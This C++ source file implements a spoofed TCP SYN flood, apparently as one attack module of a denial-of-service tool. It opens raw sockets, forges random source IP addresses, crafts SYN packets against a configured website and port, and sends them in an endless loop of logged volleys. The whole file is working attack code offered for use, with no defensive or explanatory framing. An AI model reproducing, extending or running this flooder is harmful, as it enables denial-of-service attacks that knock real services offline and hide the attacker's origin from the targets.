#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netdb.h>

#include "Randomizer.hpp"
#include "Spoofed_TCP_Flood.hpp"

void Spoofed_TCP_Flood::attack(const int *id) {
    int s, on = 1, x;
    std::string message{};
    char buf[8192];
    auto *ip = (struct ip *)buf;
    auto *tcp = (struct tcpheader *) (buf + sizeof(struct ip));
    struct hostent *hp;
    struct sockaddr_in dst{};
    auto s_port = Randomizer::randomInt(0, 65535);
    while (true){
        for(x = 0; x < conf->CONNECTIONS; x++){
            bzero(buf, sizeof(buf));
            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
                logger->Log("socket() error", Logger::Error);
                exit(EXIT_FAILURE);
            }

            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                logger->Log("setsockopt() error", Logger::Error);
                exit(EXIT_FAILURE);
            }

            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
                    logger->Log("Can't resolve the host", Logger::Error);
                    exit(EXIT_FAILURE);
                }
            }else{
                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
            }
            if((ip->ip_src.s_addr = inet_addr(Randomizer::randomIP())) < 0){
                logger->Log("Unable to set random src ip", Logger::Error);
                exit(EXIT_FAILURE);
            }

            // TCP struct
            tcp->tcp_srcport = htons(static_cast<uint16_t>(s_port));
            tcp->tcp_destport = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
            tcp->tcp_seqnum = htonl(1);
            tcp->tcp_acknum = 0;
            tcp->tcp_offset = 5;
            tcp->tcp_syn = 1;
            tcp->tcp_ack = 0;
            tcp->tcp_win = htons(32767);
            tcp->tcp_chksum = 0;
            tcp->tcp_urgptr = 0;

            ip->ip_sum = csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct tcpheader)));

            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                logger->Log("setsockopt() error", Logger::Error);
                exit(EXIT_FAILURE);
            }

            if(sendto(s, buf, ip->ip_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
                logger->Log("sendto() error", Logger::Error);
                exit(EXIT_FAILURE);
            }
            close(s);
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        usleep(static_cast<__useconds_t>(conf->delay));
    }
}

Spoofed_TCP_Flood::Spoofed_TCP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {

}
